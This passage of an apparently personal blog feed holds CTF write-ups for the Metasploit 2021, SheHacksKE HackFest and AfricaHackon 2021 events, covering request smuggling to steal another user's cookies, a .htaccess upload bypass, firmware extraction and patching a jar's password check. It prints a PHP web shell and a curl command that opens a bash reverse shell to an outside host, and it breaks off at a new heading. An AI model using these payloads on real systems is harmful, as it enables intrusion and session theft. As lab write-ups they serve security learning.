&lt;p>We can confirm this by sending the malformed request multiple times then try to access the site normally. We see that receive an
error from nginx which is as a result of the bad method.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-30.png" class="center" style="border-radius: 8px;" />
&lt;p>We can use this vulnerability to get access to the private page.&lt;/p>
&lt;p>By sending the below request, we combine any follow up requests from any other users into the second request. The foo header will
combine the first line of the next request and that will be ignored as it is not a valid header and then any subsequent headers will be
processed by the backend and the cookie header logged to save.txt.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-31.png" class="center" style="border-radius: 8px;" />
&lt;p>After sending the request multiple times we get a new entry that was not from us in save.txt. We see cookies of another user who is accessing the private
page.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-27.png" class="center" style="border-radius: 8px;" />
&lt;p>We can then use this cookies to load the private page and get the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-32.png" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag:&lt;/strong>&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/3ofhearts.png" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Reference:&lt;/strong>&lt;/p>
&lt;pre tabindex="0">&lt;code>https://regilero.github.io/english/security/2019/10/17/security_apache_traffic_server_http_smuggling/
&lt;/code>&lt;/pre>&lt;h2 id="post-ctf-solutions">Post CTF Solutions&lt;/h2>
&lt;p>Solutions to challenges I figured out after the CTF ended.&lt;/p>
&lt;h3 id="9-of-spades">9 of Spades&lt;/h3>
&lt;p>This challenge was on port 20055. The objective was to bypass the filter in place for uploading a file we can
execute php code.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-33.png" class="center" style="border-radius: 8px;" />
&lt;p>We can upload .htaccess file that specifies any extension of our choosing to execute php code.&lt;/p>
&lt;p>In the below screenshot I intercept the upload request using burp and modify the request. The .htaccess file has the
below content that enables a file with .mike extension to be executed as a php file.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>AddType application/x-httpd-php .mike
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-34.png" class="center" style="border-radius: 8px;" />
&lt;p>Now I uploaded a file with the following php code that executes system commands.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#a6e22e">system&lt;/span>($_REQUEST[&lt;span style="color:#e6db74">&amp;#39;cmd&amp;#39;&lt;/span>]);&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-35.png" class="center" style="border-radius: 8px;" />
&lt;p>Using this curl command we get a reverse shell.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>curl -G --data-urlencode &lt;span style="color:#e6db74">&amp;#34;cmd=/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/172.17.6.180/53 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span> http://172.17.6.181:20055/file_uploads/execute.mike
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-36.png" class="center" style="border-radius: 8px;" />
&lt;p>With the shell we can copy the flag to the uploads location to download it from the browser.&lt;/p>
&lt;p>&lt;strong>Flag:&lt;/strong>&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/9ofspades.png" class="center" style="border-radius: 8px;" />
&lt;h3 id="4-of-diamonds">4 of Diamonds&lt;/h3>
&lt;p>This challenge was on port 10010. When we load it on the browser we get the following app.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-37.png" class="center" style="border-radius: 8px;" />
&lt;p>After creating an account the account information is stored in the response in a script tag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-38.png" class="center" style="border-radius: 8px;" />
&lt;p>All these parameters are those provided during registration. We can try to manipulate the role from user to admin.&lt;/p>
&lt;p>During registration I intercepted the request with burp and added role as admin.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-39.png" class="center" style="border-radius: 8px;" />
&lt;p>We then get access to the admin panel that has the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/metasploit-ctf-40.png" class="center" style="border-radius: 8px;" />
&lt;p>&lt;strong>Flag:&lt;/strong>&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/metasploitctf2021/4ofdiamonds.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>Some great new challenges this year and definitely more challenging. Looking forward to next year&amp;rsquo;s CTF.&lt;/p>
&lt;p>The last challenge definitely made me feel like I need to get back to Web Security Academy.&lt;/p>
&lt;p>If you have any questions or feedback feel free to reach out.&lt;/p>
&lt;p>Another writeup you can read:&lt;/p>
&lt;pre tabindex="0">&lt;code>https://ufo.stealien.com/2021-12-07/Metasploit-CTF-Review
https://ctf.zeyu2001.com/2021/metasploit-community-ctf
&lt;/code>&lt;/pre></content></item><item><title>SheHacksKE HackFest 2021 CTF WriteUp</title><link>https://blog.ikuamike.io/posts/2021/hackfest-2021-ctf/</link><pubDate>Thu, 11 Nov 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/hackfest-2021-ctf/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/scoreboard.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>&lt;a href="https://twitter.com/shehacks_ke" target="_blank" rel="noopener">@SheHacksKE&lt;/a>
held their yearly hackfest event in October 2021 but it was online this year. The event included a CTF
that was facilitated by &lt;a href="https://twitter.com/eKRAALhub" target="_blank" rel="noopener">@eKRAALhub&lt;/a>
. &lt;a href="https://twitter.com/mystic_kev" target="_blank" rel="noopener">@mystic_kev&lt;/a>
and I participated in the CTF as
NoPwnNoGain and won it by completed all challenges. This writeup is for the challenges I was able to solve.&lt;/p>
&lt;h2 id="challenges-firmware">Challenges: Firmware&lt;/h2>
&lt;h3 id="1-camera-kernel">1. Camera Kernel&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel1.png" class="center" style="border-radius: 8px;" />
&lt;p>The provided file when extracted contains a bin file that is a linux image.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel2.png" class="center" style="border-radius: 8px;" />
&lt;p>By using binwalk to analyse the file we see the different file sections.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>binwalk demo.bin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The kernel starts at the second section indicated as the &lt;strong>OS Kernel Image&lt;/strong> and includes the &lt;strong>lzma compressed
data&lt;/strong> to end at the beginning of the squashfs filesystem.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel3.png" class="center" style="border-radius: 8px;" />
&lt;p>To provide the flag in decimal we minus the header that identifies the firmware image.&lt;/p>
&lt;pre tabindex="0">&lt;code>2097216 - 64 = 2097152
&lt;/code>&lt;/pre>&lt;p>Flag: &lt;code>Hackfest{2097152}&lt;/code>&lt;/p>
&lt;h3 id="2-backups">2. Backups&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel4.png" class="center" style="border-radius: 8px;" />
&lt;p>Based on the binwalk output we can take the root filesystem as the first squashfs filesystem. We can calculate the size as below.&lt;/p>
&lt;pre tabindex="0">&lt;code>5570624 - 2097216 = 3473408
&lt;/code>&lt;/pre>&lt;p>To extract it we can use &lt;strong>dd&lt;/strong> command line tool then mount the filesystem.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>dd &lt;span style="color:#66d9ef">if&lt;/span>&lt;span style="color:#f92672">=&lt;/span>demo.bin skip&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">2097216&lt;/span> count&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3473408&lt;/span> bs&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> of&lt;span style="color:#f92672">=&lt;/span>squashfs1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>sudo mount -t squashfs squashfs1 mount1
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel5.png" class="center" style="border-radius: 8px;" />
&lt;p>On mounting the filesystem we see the backup folders.&lt;/p>
&lt;p>Flag: &lt;code>Hackfest{backupa,backupd,backupk}&lt;/code>&lt;/p>
&lt;h3 id="3-semiconductor">3. Semiconductor&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel6.png" class="center" style="border-radius: 8px;" />
&lt;p>By looking around the root filesystem we can read the hostname of the device this image was retrieved from.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel7.png" class="center" style="border-radius: 8px;" />
&lt;p>Searching this name on google shows this is a semiconductor company confirming this is the flag.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel8.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>Hackfest{Ingenic}&lt;/code>&lt;/p>
&lt;h3 id="4-leaky-developer">4. Leaky Developer&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel12.png" class="center" style="border-radius: 8px;" />
&lt;p>The rest of the filesystem is inside the jffs2 filesystem that starts offset &lt;strong>6225984&lt;/strong> until the end.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel13.png" class="center" style="border-radius: 8px;" />
&lt;p>To extract it we can carve it out using dd.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>dd &lt;span style="color:#66d9ef">if&lt;/span>&lt;span style="color:#f92672">=&lt;/span>demo.bin skip&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">6225984&lt;/span> bs&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span> of&lt;span style="color:#f92672">=&lt;/span>jffs
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>To mount the jffs2 file system, I found the below script to be useful.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#!/bin/sh
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>set -e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">[&lt;/span> -z &lt;span style="color:#e6db74">&amp;#34;&lt;/span>$1&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">]&lt;/span>; &lt;span style="color:#66d9ef">then&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> echo usage: $0 jffs2_image directory
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">[&lt;/span> -z &lt;span style="color:#e6db74">&amp;#34;&lt;/span>$2&lt;span style="color:#e6db74">&amp;#34;&lt;/span> &lt;span style="color:#f92672">]&lt;/span>; &lt;span style="color:#66d9ef">then&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> echo usage: $0 jffs2_image directory
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">fi&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># modprobe mtdcore&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>modprobe jffs2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SIZE&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">$(&lt;/span>du -h -k $1 | cut -f 1&lt;span style="color:#66d9ef">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>SIZE&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">8192&lt;/span> &lt;span style="color:#75715e"># 65536&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ESIZE&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">$((&lt;/span> $SIZE &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#66d9ef">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>BUFS&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">512&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>modprobe mtdram &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> total_size&lt;span style="color:#f92672">=&lt;/span>$SIZE &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span> erase_size&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">${&lt;/span>ESIZE&lt;span style="color:#e6db74">}&lt;/span> &lt;span style="color:#ae81ff">\
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ae81ff">&lt;/span>&lt;span style="color:#75715e"># writebuf_size=$BUFS&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># modprobe mtdchar&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>modprobe mtdblock
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>sleep .25
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dd &lt;span style="color:#66d9ef">if&lt;/span>&lt;span style="color:#f92672">=&lt;/span>$1 of&lt;span style="color:#f92672">=&lt;/span>/dev/mtd0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mount -t jffs2 /dev/mtdblock0 $2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once we mount the filesystem as below, there&amp;rsquo;s a mount.sh file inside the bin directory that shows the folder in the
home directory.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel14.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>Hackfest{xuxuequan}&lt;/code>&lt;/p>
&lt;h3 id="5-root">5. Root&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel10.png" class="center" style="border-radius: 8px;" />
&lt;p>The shadow file in the root filesystem contains the root hash.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel9.png" class="center" style="border-radius: 8px;" />
&lt;p>I tried to crack this hash using the usual rockyou wordlist but got nothing so I jumped to google to see if I get any
hits.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel11.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>Hackfest{ismart12}&lt;/code>&lt;/p>
&lt;h3 id="6-extras">6. Extras&lt;/h3>
&lt;p>The above solutions were after some analysis of how I believe the challenges we meant to be solved. Initially I did the
basic option of extracting the image using binwalk.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>binwalk -e demo.bin
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>After this and looking through the resulting directories and some google searches later I found this post that allowed me to quickly answer
the questions.&lt;/p>
&lt;pre tabindex="0">&lt;code>https://research.nccgroup.com/2020/07/31/lights-camera-hacked-an-insight-into-the-world-of-popular-ip-cameras/
&lt;/code>&lt;/pre>&lt;h3 id="7-the-rest">7. The Rest&lt;/h3>
&lt;p>The rest of the challenges in this category were solved by Kelvin.&lt;/p>
&lt;pre tabindex="0">&lt;code>https://github.com/mystickev/CTFwriteups/tree/Writeups/shehacks-2021
&lt;/code>&lt;/pre>&lt;h2 id="challenges-protocols">Challenges: Protocols&lt;/h2>
&lt;h3 id="1-subscriber">1. Subscriber&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel15.png" class="center" style="border-radius: 8px;" />
&lt;p>First thing I did was run nmap against the host and port to figure out what the service is running.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel16.png" class="center" style="border-radius: 8px;" />
&lt;p>On discovering this is mqtt, I downloaded &lt;a href="https://github.com/thomasnordquist/MQTT-Explorer/releases" target="_blank" rel="noopener">mqtt explorer&lt;/a>
.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel17.png" class="center" style="border-radius: 8px;" />
&lt;p>Once we connect we start receiving messages, after a while the flag is sent as a message.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel18.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>Hackfest{Howdy Friend}&lt;/code>&lt;/p>
&lt;h3 id="2-hardcoded">2. Hardcoded&lt;/h3>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel19.png" class="center" style="border-radius: 8px;" />
&lt;p>The provided zip file has only two files inside.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel20.png" class="center" style="border-radius: 8px;" />
&lt;p>The config.php is somewhat encrypted.&lt;/p>
&lt;p>Using this google search I found an article with the decryption method.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel21.png" class="center" style="border-radius: 8px;" />
&lt;pre tabindex="0">&lt;code>https://blog.securityevaluators.com/terramaster-nas-vulnerabilities-discovered-and-exploited-b8e5243e7a63
&lt;/code>&lt;/pre>&lt;p>By running the below command we can get the email from the config.php&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>openssl aes-256-cbc -d -K &lt;span style="color:#ae81ff">3834326434326239383837366635383166306466626566623063643262356333&lt;/span> -iv &lt;span style="color:#ae81ff">0&lt;/span> -in config.php &amp;gt; config.php.out
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>
&lt;img src="https://blog.ikuamike.io/img/shehacks-hackfest-2021/kernel22.png" class="center" style="border-radius: 8px;" />
&lt;p>Flag: &lt;code>Hackfest{kalcaddle@qq.com}&lt;/code>&lt;/p>
&lt;h2 id="conclusion">Conclusion&lt;/h2>
&lt;p>This was a nice CTF with some not so common categories. Playing with dd was a learning process for me, I haven&amp;rsquo;t used it much before.&lt;/p>
&lt;p>Here are the challenge files incase the CTF site goes down.&lt;/p>
&lt;p>&lt;a href="https://blog.ikuamike.io/files/shehacks-hackfest-2021/demo.zip" target="_blank" rel="noopener">demo.zip&lt;/a>
&lt;/p>
&lt;p>&lt;a href="https://blog.ikuamike.io/files/shehacks-hackfest-2021/terramaster.zip" target="_blank" rel="noopener">terramaster.zip&lt;/a>
&lt;/p></content></item><item><title>AfricaHackon 2021 CTF Finals WriteUp</title><link>https://blog.ikuamike.io/posts/2021/africahackon-2021-ctf-finals/</link><pubDate>Tue, 09 Nov 2021 00:00:00 +0000</pubDate><guid>https://blog.ikuamike.io/posts/2021/africahackon-2021-ctf-finals/</guid><description/><content>&lt;img src="https://blog.ikuamike.io/img/ahfinals2021/processing0.png" class="center" style="border-radius: 8px;" />
&lt;h2 id="introduction">Introduction&lt;/h2>
&lt;p>Last week &lt;a href="https://twitter.com/mystic_kev" target="_blank" rel="noopener">@mystic_kev&lt;/a>
and I participated in the AfricaHackon 2021 CTF finals as team NoPwnNoGain, we managed position 4.
We were able to solve 3 challenges with first blood on 2 of them. This writeup demonstrates how I was able to solve one of them.&lt;/p>
&lt;h2 id="challenges">Challenges&lt;/h2>
&lt;h3 id="1-processing">1. Processing&lt;/h3>
&lt;p>Challenge description:&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/ahfinals2021/processing.png" class="center" style="border-radius: 8px;" />
&lt;p>For this challenge we are provided a zip file with the java apps for the challenge.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/ahfinals2021/processing2.png" class="center" style="border-radius: 8px;" />
&lt;p>The Challenge file is a shell script that allows for executing the challenge easily. On executing it we get a gui app.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/ahfinals2021/processing3.png" class="center" style="border-radius: 8px;" />
&lt;p>When we supply the wrong password we get access denied.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/ahfinals2021/processing4.png" class="center" style="border-radius: 8px;" />
&lt;p>Since this are jar files we can decrypt them using jadx-gui. I&amp;rsquo;ll focus on the Challenge.jar file as it&amp;rsquo;s the entrypoint
of the challenge. From jadx-gui we can spot the functions responsible for the input interface and for checking the password.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/ahfinals2021/processing5.png" class="center" style="border-radius: 8px;" />
&lt;p>The next logical step would be to reverse engineer the code and build the flag from there. If you would like to see how that
approach would have been done see these writeups.&lt;/p>
&lt;pre tabindex="0">&lt;code>https://lvmalware.github.io/writeup/2021/11/06/Africahackon-Finals.html
https://trevorsaudi.medium.com/africahackon-2021-ctf-finals-8111f8edc408
&lt;/code>&lt;/pre>&lt;p>I used a different approach that I learnt from another ctf that I would like to share.&lt;/p>
&lt;p>By using a tool called &lt;a href="https://github.com/Col-E/Recaf" target="_blank" rel="noopener">recaf&lt;/a>
we can edit the application&amp;rsquo;s code and repackage it again to run
our modified code. This means that we can utilize the existing functions and classes in the application to achieve our goal.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/ahfinals2021/processing6.png" class="center" style="border-radius: 8px;" />
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">checkPW&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String pw&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ArrayList&lt;span style="color:#f92672">&amp;lt;&lt;/span>Character&lt;span style="color:#f92672">&amp;gt;&lt;/span> output &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ArrayList&lt;span style="color:#f92672">&amp;lt;&lt;/span>Character&lt;span style="color:#f92672">&amp;gt;();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#f92672">(&lt;/span>i &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">s_key&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">length&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> test &lt;span style="color:#f92672">=&lt;/span> PApplet&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">parseChar&lt;/span>&lt;span style="color:#f92672">(&lt;/span>Challenge&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">unhex&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">s_key&lt;/span>&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> output&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">add&lt;/span>&lt;span style="color:#f92672">(&lt;/span>test&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">++&lt;/span>i&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>output&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>I edited the checkPW function as shown above, and then saved the new Challenge.jar by exporting it.&lt;/p>
&lt;pre tabindex="0">&lt;code>File -&amp;gt; Export Program
&lt;/code>&lt;/pre>&lt;p>With our Challenge.jar modified we can run the challenge then supply any input as the password check is removed and get the flag. I am not so good with java
so I let the output appear as an array then cleaned it up manually.&lt;/p>
&lt;img src="https://blog.ikuamike.io/img/ahfinals2021/processing7.png" class="center" style="border-radius: 8px;" />
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>flag&lt;span style="color:#f92672">{&lt;/span>Processing_1s_a_c00l_Pr0gramm1ng_language&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="2-phished">2. Phished&lt;/h3>
